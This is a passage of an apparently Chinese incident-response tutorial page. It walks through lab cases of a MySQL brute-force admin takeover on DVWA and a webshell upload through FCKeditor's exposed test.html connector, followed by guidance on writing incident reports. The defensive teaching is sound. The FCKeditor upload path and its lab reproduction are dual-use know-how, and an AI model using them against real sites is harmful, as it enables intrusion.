+可能是通过下载ROOT.rar全站源码备份文件获取到其中存在的木马信息，或者几年前入侵并潜藏了多年，又或者是从地下黑产购买了shell，我们不得而知。该示例中攻击者为我们留下了大量的证据和记录，而更多时候，攻击者可能会清除所有的关键信息，这势必会加大调查人员的取证难度。
+</p>
+</div>
+</div>
+<div id="outline-container-h:02bdb174-5393-4e67-8a8c-4c12cf841e13" class="outline-3">
+<h3 id="h:02bdb174-5393-4e67-8a8c-4c12cf841e13"><a href="#h:02bdb174-5393-4e67-8a8c-4c12cf841e13">管理员账号被篡改</a></h3>
+<div class="outline-text-3" id="text-h:02bdb174-5393-4e67-8a8c-4c12cf841e13">
+<p>
+使用环境：Windows Server 2008 + phpstudy + DVWA
+</p>
+
+<p>
+场景：管理员账号admin无法登录，进入数据库查看，原来管理员账号用户名不存在了，却多了另外一个管理员用户名，管理员账号被篡改了。
+</p>
+
+<p>
+管理员密码原本为admin/password
+</p>
+
+<p>
+某天管理员发现该账号已经无法登录
+</p>
+
+
+<figure id="org89346d9">
+<img style="aspect-ratio:780/684" decoding="async" loading="lazy" src="./images/img_20230817_145349.webp" alt="img_20230817_145349.webp" width="50%">
+
+</figure>
+
+<p>
+<b>日志分析：</b>
+</p>
+
+<p>
+查看数据库访问日志，发现攻击者ip存在暴力破解行为
+</p>
+
+<p>
+cat /var/lib/mysql/a21ec98a8b54.log
+</p>
+
+
+<figure id="orgddef44e">
+<img style="aspect-ratio:1582/816" decoding="async" loading="lazy" src="./images/img_20230817_145411.webp" alt="img_20230817_145411.webp" width="50%">
+
+</figure>
+
+<p>
+发现在2022年4月28日，攻击者成功连接到mysql
+</p>
+
+
+<figure id="org3d59a70">
+<img style="aspect-ratio:1578/496" decoding="async" loading="lazy" src="./images/img_20230817_145424.webp" alt="img_20230817_145424.webp" width="50%">
+
+</figure>
+
+<p>
+登录数据库查询发现在对应时间段密码被修改为hacker。
+</p>
+
+
+<figure id="org869f793">
+<img style="aspect-ratio:1510/282" decoding="async" loading="lazy" src="./images/img_20230817_145441.webp" alt="img_20230817_145441.webp" width="50%">
+
+</figure>
+
+<p>
+<b>应急措施</b>
+</p>
+<ol class="org-ol">
+<li>封禁IP地址</li>
+<li>修改管理员表密码字段为强口令</li>
+<li>修改mysql密码为强口令</li>
+<li>限制mysql外连</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac" class="outline-3">
+<h3 id="h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac"><a href="#h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac">编辑器入侵事件</a></h3>
+<div class="outline-text-3" id="text-h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac">
+<p>
+使用环境：Windows Servers 2008 + IIS + FCKeditor
+</p>
+
+<p>
+现象描述：防护设备发出预警：发现后门(Webshell)文件，建议立即进行处理。
+</p>
+
+
+<figure id="org5b78b53">
+<img style="aspect-ratio:1584/466" decoding="async" loading="lazy" src="./images/img_20230817_145532.webp" alt="img_20230817_145532.webp" width="50%">
+
+</figure>
+
+<p>
+备注：紧急处理，通过禁止动态脚本在上传目录的运行权限，使Webshell无法成功执行。
+</p>
+
+<p>
+定位上传时间：根据Webshell文件创建时间，2022年4月28日 15:18:07
+</p>
+
+
+<figure id="orgf0ad966">
+<img style="aspect-ratio:1528/938" decoding="async" loading="lazy" src="./images/img_20230817_145550.webp" alt="img_20230817_145550.webp" width="50%">
+
+</figure>
+
+<p>
+<b>Web访问日志分析</b>
+</p>
+
+<p>
+由于，IIS日志时间与系统时间相差8小时，系统时间是15:08，我们这里查看的是 6:59的日志时间。
+</p>
+
+<p>
+C:\inetpub\logs\LogFiles\W3SVC2\u_ex220428.log
+</p>
+
+
+<figure id="orge70e9b6">
+<img style="aspect-ratio:1582/444" decoding="async" loading="lazy" src="./images/img_20230817_145620.webp" alt="img_20230817_145620.webp" width="50%">
+
+</figure>
+
+<p>
+找到对应的网站访问日志，在这段时间里我们发现攻击者访问了fck的文件上传地址
+</p>
+
+<p>
+<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html</a>
+</p>
+
+
+<figure id="org6ede0a2">
+<img style="aspect-ratio:1564/396" decoding="async" loading="lazy" src="./images/img_20230817_145640.webp" alt="img_20230817_145640.webp" width="50%">
+
+</figure>
+
+<p>
+<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</a>
+</p>
+
+
+<figure id="orgdbbe20e">
+<img style="aspect-ratio:1586/746" decoding="async" loading="lazy" src="./images/img_20230817_145656.webp" alt="img_20230817_145656.webp" width="50%">
+
+</figure>
+
+<p>
+<b>漏洞复现</b>
+</p>
+
+<p>
+此处上传asp木马不成功
+</p>
+
+
+<figure id="org40dc302">
+<img style="aspect-ratio:1848/946" decoding="async" loading="lazy" src="./images/img_20230817_145754.webp" alt="img_20230817_145754.webp" width="50%">
+
+</figure>
+
+<p>
+在test.html接口成功上传Webshell
+</p>
+
+<p>
+<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html</a>
+</p>
+
+
+<figure id="org1a598d9">
+<img style="aspect-ratio:1582/688" decoding="async" loading="lazy" src="./images/img_20230817_145821.webp" alt="img_20230817_145821.webp" width="50%">
+
+</figure>
+
+<p>
+<b>还原攻击者行为：</b> 通过相关文件的访问记录进行关联分析，攻击者通过 fckeditor编辑器的测试页面成功上传Webshell。
+</p>
+
+<p>
+<b>事件处理：</b>
+</p>
+<ol class="org-ol">
+<li>删除Webshell：清除已发现的webshell，并尝试查找可能隐藏的webshell。</li>
+<li><p>
+代码完整性验证：我们来思考一个问题，如果有一个免杀的Webshell隐藏在数以万行的代码中，
+</p>
+
+<p>
+如何进行应急？&#x2013; 文件完整性校验，检查网站的源码是否被篡改过。
+</p>
+
+<p>
+操作过程：通过查看服务器上已部署的源代码版本，找研发同事要同样版本的代码。把纯净源码的所有文件计算一次hash值保存，再到服务器上执行一次hash值，通过比对hash值，输出新创建的/被修改过的/删除的文件列表。
+</p></li>
+
+<li>系统入侵排查：对系统做一个整体排查，确认是否存在后门</li>
+<li>代码修复：反馈给相关开发人员进行代码修复。</li>
+</ol>
+</div>
+</div>
+</section>
+<section id="outline-container-h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4" class="outline-2">
+<h2 id="h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4"><a href="#h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4">撰写应急响应报告</a></h2>
+<div class="outline-text-2" id="text-h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4">
+<p>
+前面我们学习了应急响应技术和实战案例，运用到实际工作中时，需要按照流程执行。应急响应常见的6个阶段：
+</p>
+
+<ol class="org-ol">
+<li>准备阶段 Preparation</li>
+<li>检测阶段 Detection</li>
+<li>抑制阶段 Control</li>
+<li>根除阶段 Eradicate</li>
+<li>恢复阶段 Recovery</li>
+<li>总结阶段 Follow</li>
+</ol>
+
+
+<figure id="orga756d8b">
+<img style="aspect-ratio:1582/836" decoding="async" loading="lazy" src="./images/img_20230817_150014.webp" alt="img_20230817_150014.webp" width="50%">
+
+</figure>
+
+<p>
+在总结阶段，安全工程师需要针对突发事件撰写应急响应报告。通常会有如下两类场景：
+</p>
+
+<p>
+1、企业具备配套的应急响应管理制度和安全措施
+</p>
+
+<p>
+按照企业已有的方法模板撰写应急响应报告，报告内容要遵循应急响应PDCERF流程。
+</p>
+
+<p>
+2、企业不具备配套的应急响应管理制度和安全措施
+</p>
+
+<p>
+这类场景也是实际工作中比较多见的场景，企业不具备配套管理制度，面对突发事件时，缺乏指导能力。此时在撰写应急响应报告时，报告应包含下述内容：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#22522;&#26412;&#20449;&#24687;&#65306;&#24212;&#24613;&#26102;&#38388;&#12289;&#24212;&#24613;&#20154;&#21592;&#12289;&#24212;&#24613;&#20107;&#20214;&#31867;&#22411;&amp;&#32423;&#21035;&#31561;&#23458;&#35266;&#20449;&#24687;&#65292;&#26681;&#25454;&#23454;&#38469;&#36827;&#34892;&#22635;&#20889;
+
+&#20107;&#20214;&#32972;&#26223;&#65306;&#20107;&#20214;&#21457;&#29983;&#26102;&#38388;&#12289;&#20107;&#20214;&#29616;&#35937;
+
+&#22788;&#29702;&#36807;&#31243;&#65306;&#26816;&#27979;&#12289;&#25233;&#21046;&#12289;&#26681;&#38500;&#12289;&#24674;&#22797;&#38454;&#27573;&#30340;&#20855;&#20307;&#24037;&#20316;
+&#65288;1&#65289;&#26816;&#27979;&#65306;&#26681;&#25454;&#20107;&#20214;&#29616;&#35937;&#21435;&#21040;&#29616;&#26377;&#23433;&#20840;&#35774;&#22791;&#20013;&#36827;&#34892;&#21578;&#35686;&#25490;&#26597;&#65292;&#25110;&#32773;&#20351;&#29992;&#24037;&#20855;&#36827;&#34892;&#26597;&#30475;&#20998;&#26512;
+&#65288;2&#65289;&#25233;&#21046;&#65306;&#37319;&#21462;&#20020;&#26102;&#38450;&#25252;&#25163;&#27573;&#36827;&#34892;&#19994;&#21153;&#24674;&#22797;&#65292;&#38477;&#20302;&#24433;&#21709;&#33539;&#22260;
+&#65288;3&#65289;&#26681;&#38500;&#65306;&#23450;&#20301;&#21040;&#25915;&#20987;&#21407;&#22240;&#21518;&#65292;&#37319;&#29992;&#38548;&#31163;&#12289;&#21024;&#38500;&#12289;&#37325;&#32622;&#31561;&#25163;&#27573;&#28165;&#38500;&#24694;&#24847;&#31243;&#24207;&#12289;&#38459;&#26029;&#25915;&#20987;&#26469;&#28304;
+&#65288;4&#65289;&#24674;&#22797;&#65306;&#25163;&#24037;&#39564;&#35777;&#30830;&#20445;&#19994;&#21153;&#24674;&#22797;&#27491;&#24120;
+
+&#20107;&#20214;&#32467;&#35770;&#65306;&#32463;&#25490;&#26597;&#21518;&#24471;&#20986;&#30340;&#20107;&#20214;&#21407;&#22240;&#12289;&#22788;&#32622;&#32467;&#26524;
+&#23433;&#20840;&#24314;&#35758;&#65306;&#26681;&#25454;&#20107;&#20214;&#21407;&#22240;&#32473;&#20986;&#38450;&#25252;&#24314;&#35758;&#65292;&#36991;&#20813;&#21516;&#31867;&#20107;&#20214;&#20877;&#27425;&#21457;&#29983;
+&#30456;&#20851;&#38468;&#20214;&#65306;&#30149;&#27602;&#26679;&#26412;&#12289;&#24322;&#24120;&#27969;&#37327;&#12289;&#24694;&#24847;&#31243;&#24207;&#31561;&#26448;&#26009;
+</pre>
+</div>
+</div>
+</section>
+</div>
+<div id="postamble" class="status">
+<!-- 这里曾经放过一个手动 AdSense 广告位（<ins> + push）。
+     问题：AdSense 要约 6 秒才把 data-ad-status 置为 unfilled，
+     在那之前填不出广告的空位会显示成一块黄色方块，体验很差。
+     现改为使用 Google 自动广告 —— 由 Google 决定何时何地插入，
+     没有广告时就不会创建空位。加载器已在 <head> 里，无需额外代码，
+     开关在 AdSense 后台的「自动广告」。 -->
+<script type="text/javascript" src="/static/aandds.com/js/postamble.js"></script>
+</div>
+</body>
+</html>
